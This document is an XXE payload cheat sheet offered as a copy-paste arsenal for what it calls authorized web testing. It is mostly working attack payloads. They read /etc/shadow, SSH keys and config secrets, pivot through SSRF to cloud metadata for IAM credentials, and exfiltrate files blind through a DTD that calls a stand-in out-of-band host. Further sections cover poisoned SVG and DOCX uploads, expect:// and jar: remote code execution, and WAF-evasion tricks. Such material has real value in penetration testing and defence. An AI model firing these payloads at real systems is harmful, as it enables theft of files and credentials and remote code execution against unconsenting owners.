# XXE Arsenal — Copy-Paste Payloads (file read · SSRF · blind OOB · error · XInclude · uploads · bypasses)

> Companion to `XXE_TESTING_GUIDE.md`. Authorized testing only. Replace `YOUR-OOB-HOST` with your Collaborator/
> Interactsh/`poc/oob_server.py` host. **Read a benign file first** (`/etc/hostname`), bound your reads, clean up uploads/OOB.

---

## §0.0 — The whole attack in one sequence

*What & when:* the entire XXE run on one screen — the **decision spine** every section below plugs into. XXE's rule: **confirm the parser expands entities, then take the highest path the target allows** — in-band file read → `php://filter` source → SSRF → cloud creds → RCE; and when nothing reflects, go **blind OOB** or **error-based**. Never fire `file://` before the benign internal-entity canary. Follow the arrows to the matching section here / guide §.

```
# ── 1. FIND the XML sink (guide §1) ──────────────────────────────────────
raw XML body · SOAP · REST that accepts application/xml · SAML · XML-RPC · uploads(SVG/DOCX/XLSX/PDF/RSS) · sitemap/feed importers
   → "JSON only"? try the CONTENT-TYPE SWITCH (§9): flip application/json → application/xml  (guide §12)

# ── 2. DETECT safely, benign-first  ★ never jump to file:// (§1, guide §2) ─
break XML (unclosed tag → error?) → then INTERNAL entity <!ENTITY test "x8bit-marker"> → &test;
   reflected  = IN-BAND (§2)   |   parsed-but-silent = BLIND (§5)   |   DOCTYPE blocked = XInclude (§7)

# ── 3. IN-BAND file read (value reflects) (§2–§3) ────────────────────────
<!ENTITY xxe SYSTEM "file:///etc/hostname">  → then escalate target: .env · web.config · id_rsa · /proc/self/environ
   file has < or & ? → php://filter/convert.base64-encode/resource=…  (§3, guide §13.1)

# ── 4. NO reflection? BLIND OOB — the money technique (§5, guide §8) ──────
target: <!DOCTYPE r [<!ENTITY % ext SYSTEM "http://OOB/evil.dtd"> %ext;]>
evil.dtd: %file=file:///etc/hostname → %eval builds %exfil=http://OOB/?x=%file; → %exfil  → loot in YOUR access log
   egress firewalled but errors verbose? → ERROR-BASED / local-DTD reuse (§6, guide §9/§13.3)

# ── 5. ESCALATE to impact (guide §13) ────────────────────────────────────
SSRF → http://169.254.169.254/…/iam/security-credentials/<role> = CLOUD CREDS (validate once w/ sts, STOP)  |  expect:// / jar: = RCE
   can't control DOCTYPE / own one node only → XInclude <xi:include href="file:///etc/passwd"/> (§7, guide §10)

# ── 6. PROVE benign, then STOP (guide §19) ───────────────────────────────
read /etc/hostname first · bound reads · one creds proof · delete uploaded artifacts · tear DOWN the OOB listener
```

> **Cash-out map (guide §17 severity):** in-band `/etc/passwd` = proof (Medium) → escalate to **source/`.env`/keys** (High) · **SSRF→cloud metadata→IAM creds** (Critical) · **RCE** (`expect://`/`jar:`/gadget, Critical) · **blind OOB** file read (High/Crit) · SVG/DOCX **upload→OOB read/SSRF** (High/Crit) · a reflected *internal* entity alone with **no file/SSRF** = **not a finding** (guide §16). Full worked run with the bytes + both DTDs: **guide Appendix A**.

---

## 1. Detection (safe, benign — do these first)
> **What & when:** your first, harmless probes — prove the app *parses* your XML and *expands abbreviations* before firing anything that fetches a file. The internal-entity test (`&test;`→marker) is safe (no outbound) and tells you which path you're on: reflected = in-band (§2), parsed-but-silent = blind (§5), DOCTYPE error = XInclude (§7).

```xml
<!-- is XML parsed? break it: unclosed tag should error -->
<?xml version="1.0"?><r>unclosed
```
```xml
<!-- does it expand + reflect INTERNAL entities? (no external fetch) -->
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY test "x8bit-marker"> ]>
<r>&test;</r>
```
`x8bit-marker` in the response → in-band (§3). Parsed but not reflected → blind (§8). DOCTYPE error → XInclude (§10)/hardened.

## 2. In-band file read (entity value reflected)
> **What & when:** use when detection showed your abbreviation gets echoed back — define `&xxe;` as "the contents of a file" and drop it in a reflected node. Read a boring file first (`/etc/hostname`) to prove it, then aim at the high-value list (`.env`, `web.config`, SSH keys, `/proc/self/environ`). Files containing `<`/`&` will break the parse → use §3's base64 filter instead.

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<r>&xxe;</r>
```
```xml
<!-- Windows -->
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<!-- other high-value files -->
file:///etc/hostname          file:///etc/shadow (root)     file:///proc/self/environ
file:///proc/self/cwd/index.php   file:///var/www/html/.env  file:///root/.ssh/id_rsa
file:///c:/inetpub/wwwroot/web.config    file:///c:/windows/system32/drivers/etc/hosts
```
Place `&xxe;` in whatever data node the app reflects (e.g. `<username>&xxe;</username>`).

## 3. Read source / files with < & (base64 via php://filter — PHP)
> **What & when:** for PHP targets when the file you want contains `<` or `&` (source code, most configs) — those characters break the XML parse. The `php://filter` wrapper base64-encodes the file first, so it embeds safely; decode the blob from the response to get raw source (→ DB creds, keys). This one trick often escalates an XXE straight to Critical.

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php"> ]>
<r>&xxe;</r>
```
Base64-decode the reflected/exfiltrated blob → raw source. Also: `resource=index.php`, `.../wp-config.php`, `.../config/database.yml`.

## 4. XXE → SSRF (internal + cloud metadata)
> **What & when:** point the fetch button at a *URL* instead of a file and the server makes the request from inside its own network — reaching internal admin panels and, the jackpot, the cloud metadata address (`169.254.169.254`) for IAM credentials. Note the GCP/Azure header requirement (often not settable via XXE). Full SSRF escalation → `../SSRF/`.

```xml
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<r>&xxe;</r>
```
```
AWS     http://169.254.169.254/latest/meta-data/  (…/iam/security-credentials/<role>)
GCP     http://metadata.google.internal/computeMetadata/v1/  (needs Metadata-Flavor header — often not settable via XXE)
Azure   http://169.254.169.254/metadata/instance?api-version=2021-02-01  (needs Metadata:true header)
internal http://127.0.0.1:8080/   http://localhost/admin   http://internal-svc:PORT/
```
Full SSRF bypasses / IMDSv2 / gopher → `../SSRF/`.

## 5. Blind OOB exfiltration (parameter entities + external DTD) ★
> **What & when:** the workhorse for the common "nothing comes back" case — make the server *mail the file to you*. Your submitted XML fetches a small DTD from your host; that DTD reads a local file and requests it back to you with the contents in the URL → it lands in your access log. Use the FTP variant when HTTP egress is filtered (Java), or the DNS-only line just to *confirm* a blind XXE exists when all egress is locked.

**Submit to the target:**
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://YOUR-OOB-HOST/evil.dtd"> %ext; ]>
<r>trigger</r>
```
**`evil.dtd` hosted on YOUR-OOB-HOST** (HTTP exfil):
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-OOB-HOST/log?x=%file;'>">
%eval;
%exfil;
```
File contents arrive in your server's access log (`?x=<contents>`). For files with newlines, use `php://filter` base64 in `%file` (single-line, URL-safe).
```xml
<!-- FTP exfil (Java; when HTTP egress is filtered) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://YOUR-OOB-HOST:2121/%file;'>">
%eval; %exfil;
```
```
DNS-only confirm (egress-restricted): point %ext at http://<unique>.YOUR-INTERACTSH  → a DNS hit proves blind XXE.
```

## 6. Error-based exfiltration (no outbound needed if egress is dead but errors show)
> **What & when:** when the server can't make outbound connections (no OOB) but prints verbose parser errors — smuggle the file's contents into an error by trying to open `file:///nonexistent/<contents>`; the "failed to open …" message leaks them. The fully-local variant reuses a DTD already on the box, so you don't even need your own server.

```xml
<!-- external evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%err;
```
File contents appear inside the "failed to open file:///nonexistent/<CONTENTS>" parser error.
```xml
<!-- fully local: reuse an on-box DTD, override its param entity (no attacker server) -->
<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
  &#x25;eval; &#x25;err;
'>
%local_dtd;
]>
<r></r>
```
Enumerate a present DTD first (common: yelp `docbookx.dtd`; distro/Java DTDs). See `poc/` notes for finding one.

## 7. XInclude (no DOCTYPE control — you only own a sub-node)
> **What & when:** for when you can't write a `<!DOCTYPE>` — either the app wraps your input inside its own XML (you own just one field) or DOCTYPEs are filtered. XInclude pulls a file into your node *without* a DOCTYPE. Inject just the `<xi:include …>` element into the parameter the server embeds.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
```xml
<!-- source via php filter -->
<xi:include parse="text" href="php://filter/convert.base64-encode/resource=/var/www/html/index.php"/>
<!-- SSRF via XInclude -->
<xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/>
```
Inject just the element the server embeds into its own XML.

## 8. File-upload payloads
> **What & when:** the richest surface — because SVGs and Office files (DOCX/XLSX/PPTX) are XML underneath, uploading one to a feature that thumbnails/extracts/converts it makes the server parse your baked-in entity. In-band SVG works if the rendered image's text is shown; otherwise use the blind-OOB SVG or the OOXML builder. Upload to resume/avatar/import/preview features.

**SVG** (image/avatar upload, SVG→PNG):
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60">
  <text x="10" y="30">&xxe;</text>
</svg>
```
**SVG blind-OOB:**
```xml
<!DOCTYPE svg [ <!ENTITY % ext SYSTEM "http://YOUR-OOB-HOST/evil.dtd"> %ext; ]>
<svg xmlns="http://www.w3.org/2000/svg"><text>x</text></svg>
```
**DOCX/XLSX/PPTX (OOXML = zip of XML):** inject into `word/document.xml` (or `[Content_Types].xml` / `xl/workbook.xml`):
```
unzip doc.docx -d d/ ; edit d/word/document.xml → add DOCTYPE + blind-OOB (as §5) at top ; (cd d && zip -r ../evil.docx .)
```
`poc/make_ooxml_xxe.py doc.docx http://YOUR-OOB-HOST/evil.dtd` builds it. Upload to resume/import/preview features.
**Other XML-backed:** GPX/KML, plist, RSS/Atom, SAML metadata — same DOCTYPE/param-entity injection.

## 9. Content-type switch (JSON endpoint → XML)
```
POST /api/v1/thing HTTP/1.1
Content-Type: application/xml        <-- was application/json

<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
```
Also try `text/xml`, `application/*+xml`.

## 10. RCE
```xml
<!ENTITY xxe SYSTEM "expect://id">                          <!-- PHP with expect ext -->
<!ENTITY xxe SYSTEM "jar:http://YOUR-HOST/evil.jar!/x">     <!-- Java jar: fetch+extract -->
```
Prove with a benign command (`id`/`whoami`) and stop.

## 11. WAF / filter bypasses
> **What & when:** when the obvious payload is blocked — route around the specific block. DOCTYPE filtered → XInclude/content-type switch; `SYSTEM` blocked → `PUBLIC`; byte-signature WAF → re-encode as UTF-16 (the parser still reads it); protocol blocked → swap wrappers; outbound dead → error-based + local-DTD.

```
DOCTYPE/ENTITY blocked   → XInclude (§7) or content-type switch (§9)
SYSTEM blocked           → PUBLIC:  <!ENTITY xxe PUBLIC "-//x//x" "file:///etc/passwd">
byte-signature WAF       → submit XML as UTF-16 (iconv -t UTF-16BE) or add a UTF-16/UTF-7 BOM
protocol blocked         → swap file:// ↔ php://filter ↔ http:// ↔ ftp:// ↔ jar: ↔ netdoc:
outbound blocked         → error-based (§6) + local-DTD reuse
nested to break sigs      → parameter entities / split the DOCTYPE across entities
```
```bash
# UTF-16 encode a payload to dodge a body WAF (parser still reads it):
iconv -f UTF-8 -t UTF-16BE payload.xml > payload_utf16.xml
```

## 12. Tooling cheat
```
Burp (Repeater + Collaborator)   manual + OOB catch (best)
Interactsh (interactsh-client)   OOB HTTP/DNS/FTP catcher
XXEinjector (Ruby)               automates OOB/error file read + brute
oxml_xxe                         builds XXE-laced Office/SVG/OOXML files
poc/ (this kit)                  oob_server.py (DTD+exfil catcher) · xxe_probe.py · make_ooxml_xxe.py · make_svg_xxe.py
defusedxml / libxml_disable_entity_loader  ← the FIXES (for the report's remediation)
```
